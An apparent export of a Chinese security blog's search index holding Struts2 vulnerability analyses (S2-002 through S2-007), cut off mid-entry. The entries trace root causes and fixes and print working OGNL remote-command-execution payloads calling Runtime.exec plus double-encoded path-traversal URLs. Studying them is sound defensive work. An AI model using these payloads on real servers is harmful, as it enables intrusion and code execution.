<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>飞企互联OA漏洞挖掘笔记(密文保护)</title>
    <link href="/2021/03/28/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94OA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/03/28/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94OA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="beeb0f2ebb46a2fc0ed271cb7efb07b471ca8f32066da61fb9b1f4e0d3fe49d8">ce21364c024e4d0343d7c954eecff585</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>致远OA 最新版漏洞挖掘笔记(密文保护)</title>
    <link href="/2021/03/28/%E8%87%B4%E8%BF%9COA-%E6%9C%80%E6%96%B0%E7%89%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2021/03/28/%E8%87%B4%E8%BF%9COA-%E6%9C%80%E6%96%B0%E7%89%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="beeb0f2ebb46a2fc0ed271cb7efb07b471ca8f32066da61fb9b1f4e0d3fe49d8">ce21364c024e4d0343d7c954eecff585</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ruoho OA漏洞挖掘笔记(密文保护)</title>
    <link href="/2021/03/28/ruoho-OA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2021/03/28/ruoho-OA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="beeb0f2ebb46a2fc0ed271cb7efb07b471ca8f32066da61fb9b1f4e0d3fe49d8">ce21364c024e4d0343d7c954eecff585</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>泛微8/9最新版漏洞挖掘笔记(密文保护)</title>
    <link href="/2021/03/28/%E6%B3%9B%E5%BE%AE8-9%E6%9C%80%E6%96%B0%E7%89%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2021/03/28/%E6%B3%9B%E5%BE%AE8-9%E6%9C%80%E6%96%B0%E7%89%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="beeb0f2ebb46a2fc0ed271cb7efb07b471ca8f32066da61fb9b1f4e0d3fe49d8">ce21364c024e4d0343d7c954eecff585</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Struts2漏洞笔记之S2-007</title>
    <link href="/2021/01/05/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-007/"/>
    <url>/2021/01/05/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-007/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>版本影响：2.0.0 ~ 2.2.3</p><p>测试环境：Struts2-2.2.3、tomcat-8.5.0</p><h1 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>在类型转换错误下，拦截器会将用户输入取出插入到当前值栈中，之后会对标签进行解析进行二次表达式解析，造成表达式注入</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>Struts2接收用户输入时会默认进行类型转换为String，便于Action操作，当配置参数类型过滤器，限制参数为整数型，回导致类型转换失败，触发拦截器<code>ConversionErrorInterceptor</code></p><p><img src="./image-20210105193510158.png" srcset="/img/loading.gif" alt="image-20210105193510158"></p><p><code>ConversionErrorInterceptor.intercept</code>方法中做了两个敏感操作，<code>StrutsConversionErrorInterceptor#getOverrideExpr</code>解析当前表达式为ASTpropery并取出，</p><p><img src="./image-20210105193955179.png" srcset="/img/loading.gif" alt="image-20210105193955179"></p><p>第二步存入该值到值栈stack中。</p><p><img src="./image-20210105194130207.png" srcset="/img/loading.gif" alt="image-20210105194130207"></p><p>接着会调用调用FormTag处理对应表单标签转换对象,利用TextFiled处理age属性，在处理结束标签<code>doEndTag</code>中，会对<code>html</code>页面中的value值即对应的<code>nameValue</code>值进行获取.回尝试获取值栈中的overrides值，存在则会进行表达式解析.</p><p><img src="./image-20210105195026668.png" srcset="/img/loading.gif" alt="image-20210105195026668"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Struts2_006_war/login.action</span> HTTP/1.1<span class="hljs-attribute">Host</span>: localhost:8085<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:83.0) Gecko/20100101 Firefox/83.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 229<span class="hljs-attribute">Origin</span>: http://localhost:8085<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://localhost:8085/Struts2_006_war/<span class="hljs-attribute">Cookie</span>: JSESSIONID=A924E4DE6CEA02F026AD3C92AC983722<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1name=123&amp;email=1&amp;age='%2b(%23_memberAccess["allowStaticMethodAccess"]%3dtrue,%23context["xwork.MethodAccessor.denyMethodExecution"]%3dfalse,%40java.lang.Runtime%40getRuntime().exec("open+/System/Applications/Calculator.app"))%2b'</code></pre><p><img src="./image-20210105195541936.png" srcset="/img/loading.gif" alt="image-20210105195541936"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>版本struts2-2.2.3.1中利用<code>org.apache.commons.lang.StringEscapeUtils.escapeJava</code>过滤字符串,转义字符串,防止单引号逃逸.</p><p><img src="./image-20210105201041628.png" srcset="/img/loading.gif" alt="image-20210105201041628"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Struts2漏洞笔记之S2-004</title>
    <link href="/2020/12/25/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-004/"/>
    <url>/2020/12/25/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-004/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>以<code>/srtuts</code>最为访问路径前缀能够进行目录穿越造成任意tomcat容器文件读取或任意目录读取.</p><h1 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h1><p>测试环境：struts2 2.1.2 tomcat 8.5.0</p><pre><code class="hljs angelscript">Struts <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> - <span class="hljs-number">2.0</span><span class="hljs-number">.11</span><span class="hljs-number">.2</span>Struts <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> - <span class="hljs-number">2.1</span><span class="hljs-number">.2</span></code></pre><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-004" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-004</a></p><h1 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>漏洞点发生在过滤器FilterDispatcher::doFilter中，也是struts2执行Action操作的入口。当匹配的mapping为null，如果用户以”/struts”路由开头去访问web服务，会找寻静态文件。分析mapping返回的执行逻辑，<code>DefaultActionMapper::dropExtension</code>中只要当前用户访问中在末尾不带有符号<code>/</code>就能够返回<code>null</code>.</p><p><img src="./image-20201225212142414.png" srcset="/img/loading.gif" alt="image-20201225212142414"></p><p>if语句满足<code>mapping==null</code>就能够进文件读取，满足路由以<code>/struts</code>开头，进入<code>FilterDispatcher::findStaticResource</code>读取静态文件。findInputStream为读取路径内容,该处文件读取会对路径进行一次URL解码.最后调用<code>ClassLoaderUtil.getResourceAsStream</code>读取文件内容.</p><p>需要注意最后会对<code>ifModifiedSince</code>字段判断，这里可以由于直接获取http头可控，可以直接构造http头<code>If-Modified-Since: 0</code>绕过</p><p><img src="./image-20201225213148341.png" srcset="/img/loading.gif" alt="image-20201225213148341"></p><p>所以最后POC构造需要对<code>/</code>进行二次URL编码，第一次tomcat解码获得<code>/ =&gt; %2f</code>,利用<code>%2f</code>能够绕过mapping对象路由判断逻辑中的<code>indexof</code>对<code>/</code>匹配，也能够绕过对结尾<code>.class</code>匹配,最后在文件读取之前被再一次解码，成功读取目录或文件内容，</p><p>目录读取</p><pre><code class="hljs angelscript">/Struts2_004_war_exploded/struts/..%<span class="hljs-number">252f</span>..%<span class="hljs-number">252f</span>..%<span class="hljs-number">252f</span>..%<span class="hljs-number">252f</span>..%<span class="hljs-number">252f</span>classes%<span class="hljs-number">252f</span></code></pre><p><img src="./image-20201225213852949.png" srcset="/img/loading.gif" alt="image-20201225213852949"></p><p>由于getResource限制了tomcat容器目录，只能读取当前容器目录下的文件，如class文件读取</p><p>具体可见：<a href="https://www.bbsmax.com/A/KE5Q6PRLdL/" target="_blank" rel="noopener">https://www.bbsmax.com/A/KE5Q6PRLdL/</a></p><pre><code class="hljs angelscript">/Struts2_004_war_exploded/struts/..%<span class="hljs-number">252f</span>..%<span class="hljs-number">252f</span>..%<span class="hljs-number">252f</span>..%<span class="hljs-number">252f</span>..%<span class="hljs-number">252f</span>classes%<span class="hljs-number">252f</span>Action%<span class="hljs-number">252f</span>LoginAction.<span class="hljs-keyword">class</span>%<span class="hljs-symbol">252f</span></code></pre><p><img src="./image-20201225214044799.png" srcset="/img/loading.gif" alt="image-20201225214044799"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>修复版本：Struts 2.0.12 or Struts 2.1.6</p><p><code>DefaultStaticContentLoader::findStaticResource</code>新版修复中会先获取一次resourceUrl(返回可读取的资源路径),调用<code>endWith</code>匹配路径末尾是否和<code>resourceUrl</code>可读资源路径末尾匹配，防御了路径穿越.</p><p><img src="./image-20201225221110696.png" srcset="/img/loading.gif" alt="image-20201225221110696"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title> Struts2漏洞笔记之S2-005</title>
    <link href="/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-005/"/>
    <url>/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-005/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>引用_memberAccess修改当前沙箱对静态方法调用限制</p><h1 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h1><p><strong>Struts 2.0.0 - Struts 2.1.8.1</strong></p><h1 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="xwork-2-0-4-与-xwork-2-0-6补丁对比"><a href="#xwork-2-0-4-与-xwork-2-0-6补丁对比" class="headerlink" title="xwork 2.0.4 与 xwork 2.0.6补丁对比"></a>xwork 2.0.4 与 xwork 2.0.6补丁对比</h2><p>官方针对S2-003漏洞修补主要操刀xwork上，对比struts 2.0.11.2 与 struts2 2.0.12版本中的xowrk包.</p><p>ParametersInterceptor中对当前值栈重新初始化valueStack，向当前newStack中新增一个<code>securityMemberAccess</code>对象而该对象中定义了字段<code>allowStaticMethodAccess</code>、<code>excludeProperties</code>、<code>acceptProperties</code>作为新的沙箱进一步限制静态方法执行</p><p><img src="./image-20201224200742400.png" srcset="/img/loading.gif" alt="image-20201224200742400"></p><p><img src="./image-20201224201344286.png" srcset="/img/loading.gif" alt="image-20201224201344286"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在work 2.0.6版本中字段<code>allowStaticMethodAccess</code>默认设置为true并不是影响方法执行关键字段。跟进java.Runtime.getRuntime执行逻辑中.会经过isMethodAccessible方法判断,在该if语句中需要使得判断为false 才能够执行invokeMethod方法.即isMethodAccessible返回<strong>true</strong></p><p><img src="./image-20201224210032647.png" srcset="/img/loading.gif" alt="image-20201224210032647"></p><p>继续跟进SecurityMemberAccess:;isAccessible方法，分析逻辑，这里需要使得isAcceptableProperty执行后返回true,跟进该方法后发现isAccepted方法返回true,只要使得isExcluded返回false即可。这里需要修改this.acceptProperties为空才满足条件，而该字段可以通过Ognl表达式引用外部对象修改.</p><p><img src="./image-20201224211508226.png" srcset="/img/loading.gif" alt="image-20201224211508226"></p><p>了解外部引用对象逻辑需要跟进<code>ASTVarRef::geValueBody=&gt;OgnlContext::get</code>,通过<code>#_memberAccess</code>就能够获取<code>SecurityMemberAccess</code>对象，就能够进一步修改<code>this.acceptProperties=false</code></p><p><img src="./image-20201224212508628.png" srcset="/img/loading.gif" alt="image-20201224212508628"></p><p>最后payload如下，当前版本可以不用设置allowStaticMethodAccess为true，为了保证poc稳定性可以加上.</p><pre><code class="hljs java">(%<span class="hljs-number">27</span>\u0023context[\%<span class="hljs-number">27</span>xwork.MethodAccessor.denyMethodExecution\%<span class="hljs-number">27</span>]\u003dfalse%<span class="hljs-number">27</span>)(bla)(bla)&amp;(%<span class="hljs-number">27</span>\u0023_memberAccess.excludeProperties\u003d<span class="hljs-meta">@java</span>.util.Collections<span class="hljs-meta">@EMPTY</span>_SET%<span class="hljs-number">27</span>)(bla)(bla)&amp;(%<span class="hljs-number">27</span>\u0023myret\u003d<span class="hljs-meta">@java</span>.lang.Runtime<span class="hljs-meta">@getRuntime</span>().exec(\%<span class="hljs-number">27</span>open\u0020/System/Applications/Calculator.app\%<span class="hljs-number">27</span>)%<span class="hljs-number">27</span>)(bla)(bla)</code></pre><p><img src="./image-20201224212948785.png" srcset="/img/loading.gif" alt="image-20201224212948785"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>Struts2 2.2.1 版本中直接加强正则匹配，先知非法字符串.</p><p><img src="./image-20201224214424414.png" srcset="/img/loading.gif" alt="image-20201224214424414"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title> Struts2漏洞笔记之S2-003</title>
    <link href="/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-003/"/>
    <url>/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-003/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>拦截器<code>ParametersInterceptor::setParameters</code>在执行参数装载时对参数名进行OGNL表达式解析造成表达式注入</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>官网通告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p><p>历史通告：<a href="https://cwiki.apache.org/confluence/pages/diffpagesbyversion.action?pageId=88882&amp;selectedPageVersions=6&amp;selectedPageVersions=7" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/pages/diffpagesbyversion.action?pageId=88882&amp;selectedPageVersions=6&amp;selectedPageVersions=7</a></p><p>版本影响：Struts 2.0.0 - Struts 2.1.8.1</p><p><img src="./image-20201223211242277.png" srcset="/img/loading.gif" alt="image-20201223211242277"></p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.struts<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>struts2-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.11.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>Version: 8.5.0</p><p><strong>选择这个版本是因为相关Payload存在特殊字符,不满足有关版本的RPC规范</strong></p><h1 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在第一篇S2-001分析Struts2处理用户请求时，会调用拦截器处理<code>ParametersInterceptor.setParameters</code>装载参数.其中在执行数据栈加载时会对传入的参数name正则判断是否存在非法字符.</p><p><img src="./image-20201223213001803.png" srcset="/img/loading.gif" alt="image-20201223213001803"></p><p>之后执行<code>stack.setValue(name, value)</code>进一步解析name值.依次解析传入的表达式造成注入</p><p><img src="./image-20201223215435856.png" srcset="/img/loading.gif" alt="image-20201223215435856"></p><h1 id="POC解析"><a href="#POC解析" class="headerlink" title="POC解析"></a>POC解析</h1><p>上方分析完具体造成Ognl注入的流程，现在是怎么构造具体POC进一步利用.</p><p>POC分为三部分</p><pre><code class="hljs java"><span class="hljs-number">1</span>. 对过滤字符使用unicode或八进制替代<span class="hljs-number">2</span>.(<span class="hljs-string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla) 设置xwork.MethodAccessor.denyMethodExecution=<span class="hljs-keyword">false</span><span class="hljs-number">3</span>.(<span class="hljs-string">'\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')'</span>)(bla)(bla)调用Runtime静态方法执行命令</code></pre><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>针对第一部分特殊字符使用unicode或八进制替代具体逻辑需要关注<code>Ognl.parseExpression</code>=&gt;<code>JavaCharStream:readChar()</code>.</p><p>匹配<code>u</code>字符后做计算转换<code>\u0023=&gt;#</code></p><p><img src="./image-20201223220533863.png" srcset="/img/loading.gif" alt="image-20201223220533863"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><pre><code class="hljs java">(<span class="hljs-string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)</code></pre><p>多个括号包裹主要是满足Ognl语法树，进行节点拆分解析表达式.默认初始化的上下文中设置<code>xwork.MethodAccessor.denyMethodExecution=true</code>限制表达式中的方法执行</p><p>所以此处需要将xwork.MethodAccessor.denyMethodExecution<code>设置为</code>false`才能进一步执行命令</p><p>打入表达式<code>#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false</code>,分析语法树之后会得到两个Node</p><pre><code class="hljs java">ASTChain =&gt; #context["xwork.MethodAccessor.denyMethodExecution"]ASTConst =&gt; <span class="hljs-string">"false"</span></code></pre><p>针对常量false会直接进行返回，最后通过<code>ASTAssign::getValueBody</code>渲染进<code>children[0]</code></p><p><img src="./image-20201223230225012.png" srcset="/img/loading.gif" alt="image-20201223230225012"></p><p>ASTChain会进一步分析语法书拆分为两个Node</p><pre><code class="hljs java">ASTVarRef =&gt; <span class="hljs-string">"#context"</span>ASTProperty =&gt; <span class="hljs-string">"["</span>xwork.MethodAccessor.denyMethodExecution<span class="hljs-string">"]"</span></code></pre><p>进入ASTChain根据Node对象类型执行相应的<code>setValue</code>方法最后会执行相应的<code>setValueBody</code>方法,<code>getValue</code>执行相应的<code>getValueBody</code>方法</p><p><img src="./image-20201223223753454.png" srcset="/img/loading.gif" alt="image-20201223223753454"></p><p>第一次执行ASTVarRef::getValueBody,会获取到当前的context字段即OgnlContext对象上下文</p><p><img src="./image-20201223224034435.png" srcset="/img/loading.gif" alt="image-20201223224034435"></p><p>第二次执行<code>ASTPropety::setValueBody</code>方法执行，进一步执行<code>OgnlRuntime.setProperty</code>,会将当前context中的<code>xwork.MethodAccessor.denyMethodExecution</code>设置为false</p><p><img src="./image-20201223224448034.png" srcset="/img/loading.gif" alt="image-20201223224448034"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>执行</p><pre><code class="hljs java">(<span class="hljs-string">'\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')'</span>)(bla)(bla)</code></pre><p>依旧会分析先拆分为两个Node</p><p><img src="./image-20201223235451918.png" srcset="/img/loading.gif" alt="image-20201223235451918"></p><p>最后执行方法成功就不一步步跟了，直接看执行exec方法时会获取上下文对象中<code>xwork.MethodAccessor.denyMethodExecution</code>值,如果为<strong>false</strong>就会执行方法否则返回null.</p><p><img src="./image-20201224001301995.png" srcset="/img/loading.gif" alt="image-20201224001301995"></p><h1 id="POC踩坑"><a href="#POC踩坑" class="headerlink" title="POC踩坑"></a>POC踩坑</h1><p>分析完之后会发现必须先执行paylaod置<code>xwork.MethodAccessor.denyMethodExecution=false</code>，打入如下payload会先执行<code>(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)</code></p><pre><code class="hljs lisp">('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)</code></pre><p><img src="./image-20201224002006901.png" srcset="/img/loading.gif" alt="image-20201224002006901"></p><p>但时当去掉#myret，打入如下payload就会先执行<code>(&#39;@java.lang.Runtime@getRuntime().exec(\&#39;open\u0020/System/Applications/Calculator.app\&#39;)&#39;)(bla)(bla)</code>,造成明显执行<strong>失败</strong></p><pre><code class="hljs lisp">('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;('@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)</code></pre><p><img src="./image-20201224002128132.png" srcset="/img/loading.gif" alt="image-20201224002128132"></p><p>这里需要探究下<code>TreeMap</code>默认排序,按照key的字典顺序排序即升序，写个Demo验证写，具体可以看TreeMap源码</p><p><img src="./image-20201224004107088.png" srcset="/img/loading.gif" alt="image-20201224004107088"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>修复见S2-005分析</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p><p><a href="https://www.javatt.com/p/36719" target="_blank" rel="noopener">https://www.javatt.com/p/36719</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title> Struts2漏洞笔记之S2-002</title>
    <link href="/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-002/"/>
    <url>/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-002/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>​    <code>&lt;s:url&gt;</code>或<code>&lt;s:a&gt;</code>接收用户输入调用<code>Request.getParameterMap</code>直接获取没做过滤处理回显至当前界面造成XSS</p><h1 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h1><pre><code class="hljs angelscript">Struts <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> ~ Struts <span class="hljs-number">2.1</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span></code></pre><h1 id="漏洞详解"><a href="#漏洞详解" class="headerlink" title="漏洞详解"></a>漏洞详解</h1><h2 id="URLTag将url标签转换为对象"><a href="#URLTag将url标签转换为对象" class="headerlink" title="URLTag将url标签转换为对象"></a>URLTag将url标签转换为对象</h2><p>当处理<code>&lt;s:url&gt;</code>标签时调用<code>class org.apache.struts2.views.jsp.URLTag</code>将标签相关属性通过<code>set</code>方法置于URLTag对象中并返回。</p><p><img src="./image-20201221201335135.png" srcset="/img/loading.gif" alt="image-20201221201335135"></p><h2 id="doStartTag构建标签组件并解析相关属性"><a href="#doStartTag构建标签组件并解析相关属性" class="headerlink" title="doStartTag构建标签组件并解析相关属性"></a>doStartTag构建标签组件并解析相关属性</h2><p>初始化<code>URLTag</code>对象后，开始进行标签解析执行<code>ComponentTagSupport::doStartTag()</code>方法.该方法做了以下事情，</p><p>1.引入当前数据栈与上下文载入<code>getBean</code>方法中，会进一步调用<code>URLTag::getBean</code>方法返回<code>org.apache.struts2.components.URL</code>对象</p><p>2.<code>container.inject(this.component);</code>将当前标签构建注入到新的容器中方便管理</p><p>3.通过<code>this.populateParams();</code>进一步调用URLTag::populateParams()方法,完善<code>URLTag::getBean</code>返回的<code>URL</code>对象</p><p>4.调用URL::start方法解析属性</p><p><img src="./image-20201221201601729.png" srcset="/img/loading.gif" alt="image-20201221201601729"></p><p>跟进URL::start方法，主要是通过开发人员设置的includeParams值存入相关输入到this.parameter字段中。当设置<code>includeParams=&quot;all&quot;</code>进入相应的逻辑处理.</p><p>1.<code>this.mergeRequestParamters</code>利用<code>Rquest::getParameterMap</code>获取未经过编码后的输入</p><p>2.<code>this.includeGetParamters</code>利用<code>Rquest::getQueryString</code>获取URL编码后的用户输入</p><p>(前两者使用差异参考：<a href="https://stackoverflow.com/questions/29299314/jsp-getquerystring-and-getparametermap-returning-different-parameters" target="_blank" rel="noopener">https://stackoverflow.com/questions/29299314/jsp-getquerystring-and-getparametermap-returning-different-parameters</a>)</p><p>3.<code>this.includeExtraParameters</code>没做特殊处理一般为null</p><p>综上最直观造成xss是由<code>Rquest::getParameterMap</code>获取用户输入并为做过滤，如果置<code>includeParams=&#39;get&#39;</code>只能调用<code>Rquest::getQueryString</code>返回用户输入经过URL编码.</p><p><img src="./image-20201221210314460.png" srcset="/img/loading.gif" alt="image-20201221210314460"></p><h2 id="doEndTag处理输出内容并写入当前jsp页面中"><a 